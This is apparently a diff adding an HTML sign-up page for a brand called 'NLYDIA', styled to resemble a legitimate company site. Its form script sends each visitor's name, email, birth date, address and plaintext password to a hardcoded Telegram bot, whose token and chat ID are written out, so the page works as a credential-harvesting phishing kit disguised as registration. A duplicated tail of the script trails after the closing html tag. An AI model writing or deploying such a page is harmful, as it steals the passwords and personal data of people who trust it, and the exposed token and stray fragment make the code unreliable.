@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign up - NLYDIA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1c1c1c;
+            color: #f0f0f0;
+        }
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background-color: #333;
+        }
+        .navbar a {
+            color: #f0f0f0;
+            text-decoration: none;
+            margin: 0 15px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            height: calc(100vh - 140px); /* 设置容器高度为视窗高度减去顶部导航栏和底部版权栏的高度 */
+            overflow: auto; /* 添加滚动条 */
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .birthdate {
+            display: flex;
+            justify-content: space-between;
+        }
+        .birthdate input[type="number"] {
+            width: calc(30% - 8px);
+            padding: 10px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            background-color: #333;
+            color: #fff;
+        }
+        .address-country input[type="text"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background-color: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #00cc00;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkbox-label {
+            margin-right: 10px;
+        }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            background-color: #333;
+            color: #fff;
+        }
+        .success-message {
+            color: green;
+            margin-top: 20px;
+        }
+        .spacer {
+            height: 100px;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo">NLYDIA</div>
+        <div>
+            <a href="index.html">Home</a>
+            <a href="about.html">About Us</a>
+            <a href="products.html">Products</a>
+            <a href="contact.html">Contact Us</a>
+        </div>
+    </div>
+    <div class="container">
+        <h2>Sign up</h2>
+        <form id="signupForm">
+            <input type="text" id="first_name" placeholder="First Name" required><br>
+            <input type="text" id="last_name" placeholder="Last Name" required><br>
+            <input type="email" id="email" placeholder="Your Email" required><br>
+            <div class="birthdate">
+                <input type="number" id="day" placeholder="Day" min="1" max="31" required>
+                <input type="number" id="month" placeholder="Month" min="1" max="12" required>
+                <input type="number" id="year" placeholder="Year" min="1900" max="2100" required>
+            </div>
+            <div class="address-country">
+                <input type="text" id="address" placeholder="Address (not necessarily)">
+            </div>
+            <div class="address-country">
+                <input type="text" id="country" placeholder="Country (not necessarily)">
+            </div>
+            <input type="password" id="password" placeholder="Password" required minlength="7"><br>
+            <div class="checkbox-container">
+                <input type="checkbox" id="human" name="human" required>
+                <label for="human" class="checkbox-label">I'm not a robot</label>
+            </div>
+            <br>
+            <input type="submit" id="signupButton" value="Sign up">
+        </form>
+        <div class="spacer"></div>
+        <div class="success-message" id="successMessage" style="display: none;">Sign up successful</div>
+    </div>
+    <div class="footer">
+        © 2024 NLYDIA. All rights reserved.
+        <p>Operators: Jared Lee</p>
+        <p>Manufacturer: Xiang</p>
+    </div>
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var firstName = document.getElementById('first_name').value;
+            var lastName = document.getElementById('last_name').value;
+            var email = document.getElementById('email').value;
+            var day = document.getElementById('day').value;
+            var month = document.getElementById('month').value;
+            var year = document.getElementById('year').value;
+            var password = document.getElementById('password').value;
+            var address = document.getElementById('address').value;
+            var country = document.getElementById('country').value;
+
+            var message = 'First Name: ' + firstName + '\n' +
+                          'Last Name: ' + lastName + '\n' +
+                          'Email: ' + email + '\n' +
+                          'Date of Birth: ' + day + '/' + month + '/' + year + '\n' +
+                          'Address: ' + address + '\n' +
+                          'Country: ' + country + '\n' +
+                          'Password: ' + password;
+
+            var botToken = '7243508319:AAHcGPRAkx7dgyucfW2dSAgVuNdXFumLNVg';
+            var chatId = '1509235250';
+            var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        document.getElementById('successMessage').style.display = 'block';
+                        document.getElementById('signupButton').disabled = true;
+                        window.location.href = 'registered.html';
+                    } else {
+                       
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending message.');
+                });
+        });
+    </script>
+</body>
+</html>
+                        window.location.href = 'registered.html';
+                    } else {
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending message.');
+                });
+        });
+    </script>
+</body>
+</html>
